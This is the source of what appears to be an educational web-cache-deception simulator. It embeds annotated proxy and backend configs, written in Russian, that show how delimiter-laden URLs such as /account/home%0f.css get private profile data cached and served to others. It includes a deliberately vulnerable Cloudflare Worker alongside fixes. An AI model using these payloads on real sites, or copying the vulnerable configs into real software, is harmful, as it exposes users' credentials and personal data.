'use client'

import { useState, useCallback, useRef, useEffect, useMemo } from 'react'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Input } from '@/components/ui/input'
import { Badge } from '@/components/ui/badge'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import {
  FlaskConical,
  Send,
  RotateCcw,
  Database,
  Server,
  AlertTriangle,
  CheckCircle2,
  ArrowDown,
  ArrowRight,
  Globe,
  Lock,
  Unlock,
  Copy,
  Settings,
  Terminal,
  Play,
  FileCode,
  Shield,
  Eye,
  Zap,
  XCircle,
  ChevronDown,
  User,
  LayoutGrid,
  Filter,
  Beaker,
  Crosshair,
  Target,
} from 'lucide-react'

/* ─────────────────────── types ─────────────────────── */

interface ProxyConfig {
  type: 'cloudflare' | 'nginx' | 'varnish' | 'apache' | 'flyio' | 'cloudflare_workers'
  cacheStaticExts: string[]
  cacheKey: 'full-url' | 'path-only' | 'normalized'
  normalizeUrl: boolean
  respectCacheControl: boolean
  defaultTtl: number
}

interface BackendConfig {
  type: 'nodejs' | 'python' | 'java' | 'ruby' | 'django' | 'laravel' | 'go' | 'dotnet'
  stripDelimiters: string[]
  ignoreAfterDelimiter: boolean
  treatDotAsFormat: boolean
}

interface ParsedResult {
  original: string
  cache: {
    path: string
    extension: string
    isStatic: boolean
    interpretation: string
    cacheDecision: string
    cacheHeaders: string
  }
  backend: {
    path: string
    extension: string | null
    isStatic: boolean
    interpretation: string
    routeMatch: string
    responsePreview: string
  }
  isVulnerable: boolean
  vulnerabilityType: string | null
  delimiterUsed: string | null
}

interface TerminalLine {
  type: 'info' | 'request' | 'response' | 'cache' | 'backend' | 'error' | 'success' | 'warn'
  text: string
  delay?: number
}

interface AttackVariant {
  url: string
  label: string
  category: 'basic' | 'delimiter' | 'encoding' | 'path-manipulation' | 'double-encoding' | 'extension-spoofing' | 'query-based' | 'advanced'
  delimiter: string
  extension: string
  route: string
  description: string
  severity: 'critical' | 'high' | 'medium' | 'low' | 'safe'
}

/* ─────────────────────── data ─────────────────────── */

const PROXY_CONFIGS: Record<string, ProxyConfig> = {
  cloudflare: {
    type: 'cloudflare',
    cacheStaticExts: ['css', 'js', 'png', 'jpg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf', 'eot', 'mp4', 'webm'],
    cacheKey: 'full-url',
    normalizeUrl: false,
    respectCacheControl: true,
    defaultTtl: 3600,
  },
  nginx: {
    type: 'nginx',
    cacheStaticExts: ['css', 'js', 'png', 'jpg', 'gif', 'svg', 'ico', 'woff', 'woff2'],
    cacheKey: 'normalized',
    normalizeUrl: true,
    respectCacheControl: true,
    defaultTtl: 1800,
  },
  varnish: {
    type: 'varnish',
    cacheStaticExts: ['css', 'js', 'png', 'jpg', 'gif', 'svg', 'ico'],
    cacheKey: 'path-only',
    normalizeUrl: false,
    respectCacheControl: false,
    defaultTtl: 7200,
  },
  apache: {
    type: 'apache',
    cacheStaticExts: ['css', 'js', 'png', 'jpg', 'gif', 'svg', 'ico', 'woff', 'woff2'],
    cacheKey: 'full-url',
    normalizeUrl: false,
    respectCacheControl: true,
    defaultTtl: 3600,
  },
  flyio: {
    type: 'flyio',
    cacheStaticExts: ['css', 'js', 'png', 'jpg', 'gif', 'svg', 'ico', 'woff', 'woff2'],
    cacheKey: 'full-url',
    normalizeUrl: false,
    respectCacheControl: true,
    defaultTtl: 3600,
  },
  cloudflare_workers: {
    type: 'cloudflare_workers',
    cacheStaticExts: ['css', 'js', 'png', 'jpg', 'gif', 'svg', 'ico', 'woff', 'woff2', 'ttf'],
    cacheKey: 'full-url',
    normalizeUrl: false,
    respectCacheControl: true,
    defaultTtl: 1800,
  },
}

const BACKEND_CONFIGS: Record<string, BackendConfig> = {
  nodejs: {
    type: 'nodejs',
    stripDelimiters: ['%0f', '%0a', '%0d', '%00', ';'],
    ignoreAfterDelimiter: true,
    treatDotAsFormat: true,
  },
  python: {
    type: 'python',
    stripDelimiters: ['%0a', '%0d', '%00'],
    ignoreAfterDelimiter: true,
    treatDotAsFormat: false,
  },
  java: {
    type: 'java',
    stripDelimiters: ['%00', ';'],
    ignoreAfterDelimiter: true,
    treatDotAsFormat: true,
  },
  ruby: {
    type: 'ruby',
    stripDelimiters: ['%0a', '%0d', '%00'],
    ignoreAfterDelimiter: false,
    treatDotAsFormat: true,
  },
  django: {
    type: 'django',
    stripDelimiters: ['%00'],
    ignoreAfterDelimiter: true,
    treatDotAsFormat: false,
  },
  laravel: {
    type: 'laravel',
    stripDelimiters: ['%00', '%0a'],
    ignoreAfterDelimiter: true,
    treatDotAsFormat: false,
  },
  go: {
    type: 'go',
    stripDelimiters: [],
    ignoreAfterDelimiter: false,
    treatDotAsFormat: false,
  },
  dotnet: {
    type: 'dotnet',
    stripDelimiters: ['%00'],
    ignoreAfterDelimiter: true,
    treatDotAsFormat: false,
  },
}

const PROXY_CONFIG_FILES: Record<string, string> = {
  cloudflare: `# ═══════════════════════════════════════════════════════
# Cloudflare Cache Rules — Правила кэширования
# ═══════════════════════════════════════════════════════
#
# КТО КЭШИРУЕТ: Cloudflare — это CDN, он стоит ПЕРВЫМ
#                между пользователем и сервером. Он
#                кэширует АВТОМАТИЧЕСКИ — это его работа.
#
# ПОЧЕМУ УЯЗВИМ: Cloudflare смотрит ТОЛЬКО на окончание
#                URL. Видит .css? Кэширует. Он НЕ проверяет
#                что внутри файла и НЕ нормализует URL.
#                /account/home%0f.css → видит .css → кэш!
#
# Что это: Cloudflare — это CDN (Content Delivery Network),
#          сеть из 300+ серверов по всему миру. Когда
#          пользователь заходит на сайт, запрос СНАЧАЛА
#          попадает на ближайший сервер Cloudflare, а НЕ
#          на сам сайт. Cloudflare решает: отдать из кэша
#          или переслать на сервер-источник.
#
# Зачем: Чтобы страница загружалась быстрее — Cloudflare
#        сохраняет у себя копии файлов и отдаёт их без
#        запроса к настоящему серверу. Это и есть "кэш".
# ═══════════════════════════════════════════════════════

cache_rules:
  # ── Правило 1: CSS-файлы кэшировать ──
  # Что делает: если URL заканчивается на .css —
  #             сохраняем файл в кэш на 1 час (3600 секунд)
  #             и на "краевых" серверах на 2 часа (7200 сек)
  # Почему: CSS — это стили (цвета, шрифты, размеры),
  #        они редко меняются, их можно смело кэшировать
  - expression: "http.request.uri.path.ends_with('.css')"
    action: cache            # cache = сохранить в кэше
    ttl: 3600                # 3600 секунд = 1 час в браузере
    edge_ttl: 7200           # 7200 секунд = 2 часа на серверах Cloudflare

  # ── Правило 2: JS-файлы кэшировать ──
  # Что делает: если URL заканчивается на .js — кэшируем
  # Почему: JavaScript — это скрипты (анимации, кнопки),
  #        они тоже статические и редко меняются
  - expression: "http.request.uri.path.ends_with('.js')"
    action: cache
    ttl: 3600                # 1 час

  # ── Правило 3: Изображения кэшировать ──
  # Что делает: если URL заканчивается на .png — кэшируем
  # Почему: Картинки тяжёлые, их точно нужно кэшировать
  - expression: "http.request.uri.path.ends_with('.png')"
    action: cache
    ttl: 86400               # 86400 секунд = 1 сутки

  # ── Правило 4: API-запросы НЕ кэшировать ──
  # Что делает: если URL начинается с /api/ — пропускаем
  #             мимо кэша, отправляем прямо на сервер
  # Почему: API возвращает персональные данные (профиль,
  #        баланс), кэшировать их нельзя — чужие данные
  #        достанутся другому пользователю!
  - expression: "http.request.uri.path.matches('/api/*')"
    action: bypass           # bypass = пропустить мимо кэша

  # ═══ КЛЮЧЕВОЙ МОМЕНТ: Как Cloudflare определяет,
  #       что файл статический и его можно кэшировать ═══
  # Он смотрит на ОКОНЧАНИЕ URL:
  #   /style.css    → видит .css  → "Это стили, кэшируем!"
  #   /account/home → нет .css/.js → "Это страница, не кэшируем"
  #
  # ПРОБЛЕМА: а что если URL такой:
  #   /account/home%0f.css
  #   ↑ Cloudflare видит .css в конце → "Кэшируем!"
  #   ↑ Но сервер видит /account/home → возвращает профиль!
  #   ↑ Результат: профиль жертвы кэширован как CSS-файл!

  # ── Настройки ключа кэша ──
  # Ключ кэша — это уникальный идентификатор, по которому
  # Cloudflare ищет сохранённый ответ. Два запроса с одним
  # ключом → Cloudflare отдаст один и тот же кэш.
  cache_key:
    include_query_string: true   # Учитывать ?param=value в URL
    normalize_path: false        # ← ОПАСНО! Не убирает спецсимволы
                                  # %0f остаётся в ключе как есть
                                  # Cloudflare НЕ понимает, что
                                  # %0f — это разделитель
    ignore_delimiters: []        # Не игнорировать никакие разделители
                                  # Это значит: /home%0f.css и
                                  # /home.css — РАЗНЫЕ ключи кэша`,

  nginx: `# ═══════════════════════════════════════════════════════
# nginx.conf — Конфигурация Nginx как обратного прокси
# ═══════════════════════════════════════════════════════
#
# КТО КЭШИРУЕТ: Nginx кэширует ТОЛЬКО если настроен
#                proxy_cache. Без этих настроек он просто
#                пересылает запросы дальше (не кэширует).
#
# ПОЧЕМУ УЯЗВИМ: Nginx НОРМАЛИЗУЕТ URL перед проверкой.
#                /home%0f.css → удаляет %0f → /home.css
#                ВАЖНО: если перед Nginx стоит Cloudflare,
#                то Cloudflare кэширует РАНЬШЕ, и Nginx
#                запрос даже не увидит!
#
# Что это: Nginx — это веб-сервер, который стоит перед
#          настоящим сервером приложения. Он принимает
#          запросы от пользователей (или от Cloudflare)
#          и решает: отдать ответ из кэша (быстро) или
#          переслать запрос на сервер-источник (медленно).
#
# Зачем: Чтобы не нагружать сервер приложения лишними
#        запросами за статические файлы (картинки, стили).
# ═══════════════════════════════════════════════════════

# ── Настройка хранилища кэша ──
# proxy_cache_path — где и как хранить кэш на диске
proxy_cache_path /var/cache/nginx   # Папка для кэша на диске
                 levels=1:2         # Подпапки (для скорости поиска)
                 keys_zone=STATIC:10m # Имя зоны "STATIC", 10 МБ памяти
                                     # для ключей кэша (сами файлы — на диске)
                 max_size=1g        # Максимум 1 ГБ на диске под кэш
                 inactive=60m;      # Удалить файл, если к нему не
                                    # обращались 60 минут

server {
    listen 80;                      # Принимать запросы на порт 80 (HTTP)
    server_name example.com;        # Домен сайта

    # ── Статические файлы — кэшировать ──
    # location ~* — регулярное выражение (без учёта регистра)
    # \\.css и \\.js — файлы с расширениями .css, .js и т.д.
    # Если URL заканчивается на одно из этих расширений —
    # Nginx сохранит ответ в кэш и будет отдавать его сам
    location ~* \\.(css|js|png|jpg|gif|svg|ico)$ {
        proxy_cache STATIC;          # Использовать зону "STATIC"
                                      # (ту самую, что создали выше)
        proxy_cache_valid 200 30m;   # Кэшировать ответы со статусом 200
                                      # (успешные) на 30 минут
        proxy_cache_key "$scheme$host$uri";
        # ↑ Ключ кэша = протокол + домен + путь URL
        #   Пример: https://example.com/style.css
        #   Nginx НОРМАЛИЗУЕТ путь перед созданием ключа
        #   /home%0f.css → Nginx удалит %0f → /home.css
        add_header X-Cache-Status $upstream_cache_status;
        # ↑ Добавить заголовок-подсказку:
        #   HIT  = взято из кэша (быстро)
        #   MISS = запросили у сервера (медленно)
    }

    # ── Динамические запросы — проксировать без кэша ──
    # location / — все остальные URL (не попавшие в правило выше)
    location / {
        proxy_pass http://backend;   # Переслать запрос на сервер-источник
                                      # "backend" — это адрес сервера
                                      # приложения (Node.js, Python и т.д.)
        proxy_cache_bypass 1;        # Обойти кэш — всегда спрашивать сервер
                                      # 1 = true (да, обойти кэш)
    }
}

# ═══ ВАЖНОЕ ОТЛИЧИЕ NGINX ОТ CLOUDFLARE ═══
# Nginx НОРМАЛИЗУЕТ URL перед проверкой:
#   /account/home%0f.css
#   → Nginx видит %0f, удаляет его
#   → Путь становится /home.css
#   → Ключ кэша: https://example.com/home.css
#
# Cloudflare НЕ нормализует:
#   /account/home%0f.css
#   → Ключ кэша: https://example.com/account/home%0f.css
#   → Cloudflare видит .css → кэширует!
#
# Если перед Nginx стоит Cloudflare, то:
#   Cloudflare кэширует ответ → Nginx его даже не увидит
#   Результат: расхождение между кэшем и сервером!`,

  varnish: `# ═══════════════════════════════════════════════════════
# default.vcl — Конфигурация Varnish Cache
# ═══════════════════════════════════════════════════════
#
# Что это: Varnish — это кэширующий прокси-сервер.
#          Он встаётся между пользователем и сервером.
#          Настраивается на языке VCL (Varnish Config Language).
#
# Зачем: Varnish очень быстрый — он хранит кэш в оперативной
#        памяти и отдаёт ответы за миллисекунды.
#
# VCL — это не обычный конфиг, а программа с "подпрограммами":
#   vcl_recv   — вызывается при получении запроса (от клиента)
#   vcl_backend_response — вызывается при получении ответа (от сервера)
#   vcl_deliver — вызывается перед отправкой ответа клиенту
# ═══════════════════════════════════════════════════════

vcl 4.1;                        # Версия языка VCL

# ── Где искать настоящий сервер ──
# backend — это сервер-источник (Node.js, Python и т.д.)
# Varnish будет пересылать ему запросы, если нет кэша
backend default {
    .host = "127.0.0.1";        # IP-адрес сервера (localhost = этот же сервер)
    .port = "8080";              # Порт, на котором работает сервер приложения
}

# ── Подпрограмма vcl_recv: обработка входящего запроса ──
# Вызывается каждый раз, когда пользователь (или браузер)
# отправляет запрос. Здесь мы решаем: кэшировать или нет.
sub vcl_recv {

    # Проверяем: заканчивается ли URL на .css, .js, .png и т.д.
    # req.url — это путь из запроса (например, /style.css)
    # ~ — оператор регулярного выражения (поиск по шаблону)
    # $ — конец строки (должно заканчиваться на .css и т.д.)
    if (req.url ~ "\\.(css|js|png|jpg|gif|svg|ico)$") {
        unset req.http.Cookie;    # Удалить Cookie из запроса
                                   # Зачем: Cookie делает кэш уникальным
                                   # для каждого пользователя. Без Cookie
                                   # кэш будет общим для всех. Для стилей
                                   # и картинок это нормально — они одинаковые.
        return (hash);            # hash = "ищи в кэше, а если нет —
                                   #          запроси у сервера и сохрани"
    }

    # ═══ ПРОБЛЕМА: Varnish НЕ нормализует URL ═══
    # req.url используется КАК ЕСТЬ — без изменений.
    # Если пришёл: /account/home%0f.css
    #   → Varnish видит .css в конце → кэшировать!
    #   → Ключ кэша = /account/home%0f.css (полный путь)
    #   → Сервер получит: /account/home (обрежет %0f)
    #   → Сервер вернёт профиль жертвы
    #   → Varnish сохранит профиль в кэше как "CSS-файл"
    #   → Любой, кто запросит /account/home%0f.css,
    #     получит данные жертвы из кэша!
}

# ── Подпрограмма vcl_backend_response: обработка ответа сервера ──
# Вызывается, когда сервер-источник вернул ответ.
# Здесь мы решаем, насколько долго его кэшировать.
sub vcl_backend_response {
    if (beresp.status == 200) {   # Если статус 200 (всё ОК)
        set beresp.ttl = 2h;      # ttl = Time To Live = время жизни кэша
                                   # 2h = 2 часа. Через 2 часа кэш удалится
                                   # и Varnish снова спросит у сервера.
    }
    # ВНИМАНИЕ: нет проверки на Content-Type!
    # Даже если сервер вернул JSON с данными пользователя,
    # Varnish всё равно кэширует на 2 часа — ведь статус 200.
    # Нужно добавить: if (beresp.http.Content-Type ~ "json") { set beresp.ttl = 0s; }
}

# ── Подпрограмма vcl_deliver: отправка ответа клиенту ──
# Вызывается прямо перед тем, как отдать ответ пользователю.
# Добавляем отладочный заголовок, чтобы понимать: из кэша или нет.
sub vcl_deliver {
    if (obj.hits > 0) {                    # obj.hits = сколько раз этот кэш
                                            # использовали. > 0 = есть в кэше
        set resp.http.X-Cache = "HIT";     # HIT = ответ из кэша (быстро)
    } else {
        set resp.http.X-Cache = "MISS";    # MISS = ответ от сервера (медленно)
    }
    # Как использовать: откройте DevTools → Network →
    # посмотрите заголовок X-Cache в ответе
}`,

  apache: `# ═══════════════════════════════════════════════════════
# httpd.conf — Конфигурация Apache HTTP Server
# ═══════════════════════════════════════════════════════
#
# КТО КЭШИРУЕТ: Apache через модуль mod_cache.
#                Кэширует ТОЛЬКО если mod_cache включён.
#                Без модуля — просто проксирует запросы.
#
# ПОЧЕМУ УЯЗВИМ: Apache НЕ нормализует URL агрессивно,
#                как Nginx. Символы %0f, %00, %0a могут
#                пройти через mod_rewrite без изменений.
#                mod_cache проверяет расширение URL:
#                .css? Кэшируем! Что внутри — не смотрит.
#
# Что это: Apache — один из старейших веб-серверов.
#          Его модульная архитектура позволяет добавлять
#          кэширование через модули mod_cache и
#          mod_cache_disk.
#
# Зачем: Как и другие прокси, Apache кэширует для
#        ускорения отдачи статических файлов.
# ═══════════════════════════════════════════════════════

# ── Включаем модуль кэширования ──
LoadModule cache_module modules/mod_cache.so
LoadModule cache_disk_module modules/mod_cache_disk.so

# ── Настройка дискового кэша ──
# Где хранить кэшированные файлы на диске
CacheRoot /var/cache/httpd
CacheDirLevels 2
CacheDirLength 1
CacheMaxFileSize 10000000    # Макс. размер файла: 10 МБ

# ── Правила кэширования ──
# CacheEnable: включить кэширование для URL
# disk: сохранять на диск
# "/": для всех URL (опасно!)
CacheEnable disk /

# ═══ ОПАСНЫЕ ДИРЕКТИВЫ, которые делают Apache уязвимым: ═══
# CacheIgnoreCacheControl On   ← Игнорировать Cache-Control!
# CacheStoreNoStore On         ← Кэшировать даже no-store!
# CacheIgnoreHeaders Set-Cookie ← Удалить Set-Cookie из кэша!
#
# Если эти директивы включены — Apache кэширует ВСЁ,
# включая персональные данные, и отдаёт их всем.

# ── mod_rewrite: обработка URL ──
# mod_rewrite применяется ДО mod_cache
# Но Apache НЕ нормализует URL автоматически
RewriteEngine On
# URL-кодированные спецсимволы проходят как есть:
# /account/home%0f.css → остаётся %0f в пути
# mod_cache видит .css → кэширует!

# ── Безопасная настройка: отключить кэш для динамических ──
# CacheDisable /account/
# CacheDisable /api/
# CacheDisable /profile/
# ↑ Это частичная защита, но %0f может обойти
#   проверку пути, потому что URL кодирован

# ═══ СРАВНЕНИЕ С NGINX ═══
# Nginx: нормализует URL → удаляет %0f → /home.css
# Apache: НЕ нормализует → /account/home%0f.css → .css = кэш!
# Apache БОЛЕЕ уязвим к WCD, чем Nginx`,

  flyio: `# ═══════════════════════════════════════════════════════
# Fly.io — Конфигурация кэширования
# ═══════════════════════════════════════════════════════
#
# КТО КЭШИРУЕТ: Fly.io через встроенный обратный прокси
#                или Varnish sidecar. Кэширует, если
#                настроен fly-cache-url или подключён Varnish.
#
# ПОЧЕМУ УЯЗВИМ: Внутренний прокси Fly.io НЕ нормализует
#                URL. Спецсимволы %0f, %00, %0a проходят
#                как есть. Если прокси проверяет расширение
#                URL (.css = кэшировать), атака WCD сработает.
#
# Что это: Fly.io — облачная платформа, которая запускает
#          Docker-контейнеры на краевых серверах по всему
#          миру. Приложение разворачивается близко к
#          пользователю — это ускоряет загрузку.
#
# Зачем: Fly.io может кэшировать HTTP-ответы через
#        встроенный прокси (fly-cache-url) или Varnish
#        sidecar. Это ускоряет отдачу статического контента.
# ═══════════════════════════════════════════════════════

# ── Способ 1: fly-cache-url (встроенный прокси) ──
# В Dockerfile приложения указываем:
# EXPOSE 8080
# ENV FLY_CACHE_URL=http://localhost:8080
#
# Fly.io создаёт кэширующий прокси перед приложением.
# Он проверяет расширение URL и Cache-Control заголовки.
# Проблема: НЕ нормализует URL → /home%0f.css = кэш!

# ── Способ 2: Varnish sidecar ──
# В fly.toml добавляем:
# [services]
#   [[services.ports]]
#     handlers = ["http"]
#     port = 80
#
# Varnish запускается как sidecar-контейнер рядом с
# приложением. Настраивается через VCL (как обычный Varnish).
# Уязвим точно так же: НЕ нормализует URL.

# ── Правила кэширования Fly.io ──
# Встроенный прокси кэширует по расширению URL:
#   /style.css      → .css → кэшировать (TTL: 3600s)
#   /app.js         → .js  → кэшировать (TTL: 3600s)
#   /logo.png       → .png → кэшировать (TTL: 3600s)
#   /account/home   → нет расширения → НЕ кэшировать
#
# ═══ ПРОБЛЕМА ═══
# /account/home%0f.css
#   → Прокси видит .css → кэшировать!
#   → Приложение обрезает %0f → /account/home → профиль!
#   → Профиль жертвы сохранён в кэше Fly.io!
#
# Как Fly.io сравнивается с другими платформами:
#   Vercel:  кэширует статику автоматически, НЕ нормализует
#   Netlify: кэширует статику автоматически, НЕ нормализует
#   Railway: НЕТ встроенного кэша → нужен Nginx/Varnish
#   Render:  НЕТ встроенного кэша → нужен Nginx/Varnish`,

  cloudflare_workers: `# ═══════════════════════════════════════════════════════
# worker.js — Cloudflare Workers (Edge Function)
# ═══════════════════════════════════════════════════════
#
# КТО КЭШИРУЕТ: Cloudflare Workers через Cache API.
#                Worker — это JavaScript-код, который
#                выполняется на краевых серверах Cloudflare.
#                Он может ПРОГРАММНО управлять кэшем.
#
# ПОЧЕМУ УЯЗВИМ: Worker может кэшировать ответы БЕЗ
#                проверки Content-Type. Если Worker
#                проверяет только расширение URL (.css),
#                он закэширует динамический контент.
#                Worker НЕ нормализует URL автоматически.
#
# Что это: Cloudflare Workers — это серверные функции,
#          которые работают на 300+ серверах Cloudflare
#          по всему миру. Они могут перехватывать
#          запросы, управлять кэшем и модифицировать
#          ответы.
#
# Зачем: Workers позволяют программно управлять кэшем,
#        создавать кастомные правила кэширования и
#        обрабатывать запросы на краевых серверах.
# ═══════════════════════════════════════════════════════

// ── УЯЗВИМЫЙ Worker ──
// Этот Worker кэширует по расширению URL — ОПАСНО!
addEventListener('fetch', event => {
  const url = new URL(event.request.url)

  // Кэшировать ВСЁ, что заканчивается на .css — ОПАСНО!
  if (url.pathname.endsWith('.css')) {
    event.respondWith(
      caches.default.match(event.request).then(cached => {
        if (cached) return cached
        return fetch(event.request).then(response => {
          // Сохраняем в кэш БЕЗ проверки Content-Type!
          caches.default.put(event.request, response.clone())
          return response
        })
      })
    )
  }
})

// ═══ ПРОБЛЕМА ═══
// URL: /account/home%0f.css
//   → Worker видит .css → проверяет кэш → MISS
//   → Запрашивает у сервера-источника
//   → Сервер обрезает %0f → /account/home → профиль!
//   → Worker сохраняет профиль в кэше как "CSS-файл"
//   → Любой, кто запросит /account/home%0f.css,
//     получит данные жертвы из кэша!

// ── БЕЗОПАСНЫЙ Worker ──
// Проверяем Content-Type ПЕРЕД кэшированием
addEventListener('fetch', event => {
  const url = new URL(event.request.url)

  // Нормализуем: удаляем спецсимволы из пути
  const cleanPath = url.pathname.replace(/[\\x00-\\x1f\\x7f]/g, '')
  if (cleanPath !== url.pathname) {
    event.respondWith(new Response('Bad Request', { status: 400 }))
    return
  }

  if (url.pathname.endsWith('.css')) {
    event.respondWith(
      caches.default.match(event.request).then(cached => {
        if (cached) return cached
        return fetch(event.request).then(response => {
          // Проверяем Content-Type ПЕРЕД кэшированием!
          const ct = response.headers.get('Content-Type') || ''
          if (ct.includes('text/css')) {
            caches.default.put(event.request, response.clone())
          }
          return response
        })
      })
    )
  }
})

// ── Cache API в Workers ──
// caches.default     — глобальный кэш Cloudflare
// caches.open(name)  — именованная область кэша
//
// Пример поиска в кэше:
//   const cached = await caches.default.match(request)
//
// Пример сохранения в кэш:
//   await caches.default.put(request, response.clone())
//
// Пример удаления из кэша:
//   await caches.default.delete(request)`,
}

const BACKEND_CONFIG_FILES: Record<string, string> = {
  nodejs: `// ═══════════════════════════════════════════════════════
// app.js — Node.js + Express сервер
// ═══════════════════════════════════════════════════════
//
// Что это: Express — это фреймворк для создания серверов
//          на языке JavaScript (Node.js). Он принимает
//          HTTP-запросы и возвращает ответы.
//
// Как работает маршрутизация:
//   app.get('/путь', обработчик)
//   — если URL совпадает с '/путь' — вызывается обработчик
//   — если нет — Express вернёт 404 (не найдено)
// ═══════════════════════════════════════════════════════

const express = require('express');  // Подключаем фреймворк Express
const app = express();               // Создаём приложение-сервер

// ── Middleware: парсинг URL ──
// Middleware — это промежуточная функция, которая обрабатывает
// каждый запрос до того, как он попадёт в обработчик маршрута.
//
// Express автоматически декодирует URL-кодированные символы:
//   /account/home%0f.css
//   → decoded: /account/home\x0f.css
//   → \x0f — это невидимый управляющий символ (Shift In)
//
// ВАЖНО: маршрут '/account/home' НЕ совпадёт с путём,
// содержащим \x0f! Это ДРУГОЙ путь для Express.
// Но если прокси обрезает %0f ДО передачи запроса —
// Express получит чистый /account/home — и маршрут совпадёт!

// ── Защищённый маршрут — профиль пользователя ──
// app.get(путь, middleware, обработчик)
// authMiddleware — проверяет, что пользователь залогинен
// req — объект запроса (всё, что прислал браузер)
// res — объект ответа (что сервер вернёт браузеру)
app.get('/account/home', authMiddleware, (req, res) => {
    // req.user — данные текущего пользователя
    // Извлекаются из cookie или session (сессии)
    const userData = {
        username: req.user.email,        // Email пользователя
        api_key: req.user.apiKey,        // Его секретный API-ключ
        balance: req.user.balance,       // Баланс аккаунта
        personal_data: req.user.personalData  // Личные данные
    };
    res.json(userData);  // Отправить данные как JSON-ответ
    //                        ↑ ВНИМАНИЕ! Нет заголовка Cache-Control!
    //                        ↑ По умолчанию Express НЕ добавляет
    //                          Cache-Control: no-store
    //                        ↑ Это значит: кэш-сервер может сохранить
    //                          этот ответ и выдать его другому человеку!
    //
    // КАК ИСПРАВИТЬ:
    //   res.set('Cache-Control', 'no-store').json(userData);
    //   ↑ no-store = "не сохранять в кэше НИКОГДА"
});

// ── Статические файлы ──
// express.static — раздаёт файлы из папки 'public'
// (картинки, стили, скрипты) без участия серверного кода
app.use('/static', express.static('public'));

// ═══ КАК ПРОИСХОДИТ РАСХОЖДЕНИЕ ═══
// 1. Атакующий создаёт URL: /account/home%0f.css
// 2. Прокси (Cloudflare) видит .css → кэширует
// 3. Прокси пересылает запрос на Express
//    ВАРИАНТ А: Прокси передал как есть → /account/home%0f.css
//       → Express декодирует: /account/home\x0f.css
//       → Маршрут НЕ совпадает → 404
//    ВАРИАНТ Б: Прокси обрезал %0f → /account/home
//       → Маршрут СОВПАДАЕТ → возвращает профиль!
//       → Кэш сохраняет профиль как .css файл!
//
// Вариант Б — это и есть атака Web Cache Deception!`,

  python: `# ═══════════════════════════════════════════════════════
# app.py — Python + Flask сервер
# ═══════════════════════════════════════════════════════
#
# Что это: Flask — это лёгкий фреймворк для создания
#          веб-серверов на языке Python. Он принимает
#          HTTP-запросы и возвращает ответы.
#
# Как работает маршрутизация:
#   @app.route('/путь') — декоратор, который связывает
#   URL-путь с функцией-обработчиком.
#   Если URL точно совпадает — функция вызывается.
#   Если нет — Flask вернёт 404 (не найдено).
# ═══════════════════════════════════════════════════════

from flask import Flask, request, jsonify  # Импортируем Flask и инструменты
from auth import require_auth               # Наша функция проверки логина

app = Flask(__name__)  # Создаём приложение Flask
                       # __name__ = имя текущего файла

# ── Защищённый маршрут — профиль пользователя ──
# @app.route('/account/home') — привязать URL /account/home
# @require_auth — декоратор проверки: пользователь залогинен?
# Если не залогинен — вернёт 401 (не авторизован)
@app.route('/account/home')
@require_auth
def account_home():                    # Функция-обработчик
    user = get_current_user()          # Получить данные текущего пользователя
    return jsonify({                   # Вернуть как JSON-ответ
        'username': user.email,        # Email пользователя
        'api_key': user.api_key,       # Его секретный API-ключ
        'balance': user.balance,       # Баланс аккаунта
    })
    # ↑ ВНИМАНИЕ! Нет Cache-Control: no-store!
    # ↑ Flask по умолчанию НЕ добавляет этот заголовок
    # ↑ Кэш-сервер может сохранить этот ответ
    #
    # КАК ИСПРАВИТЬ:
    #   response = jsonify({...})
    #   response.headers['Cache-Control'] = 'no-store'
    #   return response
    #   ↑ no-store = "не сохранять в кэше НИКОГДА"

# ═══ Как Flask обрабатывает спецсимволы в URL ═══
# Python декодирует URL перед маршрутизацией:
#   /account/home%0a.css → /account/home\n.css
#   \n = перевод строки (новая строка)
#   /account/home%00.css → /account/home\x00.css
#   \x00 = null-байт (пустой символ)
#
# Что происходит при разных разделителях:
#
#   URL: /account/home%0a.css
#   → Flask декодирует: /account/home\n.css
#   → Маршрут '/account/home' НЕ совпадает → 404
#   → Но если прокси ОБРЕЗАЕТ %0a → отправляет /account/home
#   → Маршрут СОВПАДАЕТ → возвращает профиль!
#   → Кэш сохраняет профиль как .css файл!
#
#   URL: /account/home%00.css
#   → Flask обрезает по null-байту: /account/home
#   → Маршрут СОВПАДАЕТ → возвращает профиль!
#   → И даже без участия прокси — это уязвимость!
#
# Вывод: %00 опаснее %0a, потому что Flask сам обрезает путь`,

  java: `// ═══════════════════════════════════════════════════════
// Application.java — Java + Spring Boot сервер
// ═══════════════════════════════════════════════════════
//
// Что это: Spring Boot — это фреймворк для создания
//          серверов на языке Java. Он автоматически
//          настраивает маршрутизацию и обработку запросов.
//
// Аннотации — это подсказки для Spring:
//   @RestController — этот класс обрабатывает HTTP-запросы
//   @RequestMapping — базовый путь для всех маршрутов
//   @GetMapping — обработчик GET-запроса
//   @PreAuthorize — проверка прав доступа
// ═══════════════════════════════════════════════════════

@RestController                       // Этот класс = обработчик HTTP-запросов
@RequestMapping("/account")           // Все маршруты начинаются с /account
public class AccountController {

    // ── Защищённый маршрут — профиль пользователя ──
    // Полный путь: /account + /home = /account/home
    @GetMapping("/home")              // Обрабатывает GET-запрос к /account/home
    @PreAuthorize("isAuthenticated()") // Только для залогиненных!
                                       // Если не залогинен → 403 (запрещено)
    public ResponseEntity<UserData> accountHome(
            @AuthenticationPrincipal User user) {
                                       // @AuthenticationPrincipal = текущий
                                       // залогиненный пользователь (из cookie)
        UserData data = new UserData(   // Создаём объект с данными
            user.getEmail(),            // Email пользователя
            user.getApiKey(),           // Его секретный API-ключ
            user.getBalance()           // Баланс аккаунта
        );
        return ResponseEntity.ok(data); // Вернуть 200 OK + данные как JSON
        // ↑ ВНИМАНИЕ! Нет Cache-Control: no-store!
        // ↑ Spring Boot по умолчанию НЕ добавляет этот заголовок
        // ↑ Кэш-сервер может сохранить ответ
        //
        // КАК ИСПРАВИТЬ:
        //   return ResponseEntity.ok()
        //       .cacheControl(CacheControl.noStore())
        //       .body(data);
    }
}

// ═══ Как Spring MVC обрабатывает спецсимволы ═══
// Spring MVC работает поверх сервера приложений (Tomcat/Undertow)
//
// 1. Точка с запятой (;) — matrix-параметры:
//    /account/home;.css
//    → Spring видит ; — это "matrix parameter" (доп. параметр пути)
//    → Обрезает ;.css → маршрут /account/home
//    → СОВПАДАЕТ → возвращает профиль!
//    → Но прокси видит .css → кэширует!
//
// 2. Null-байт (%00):
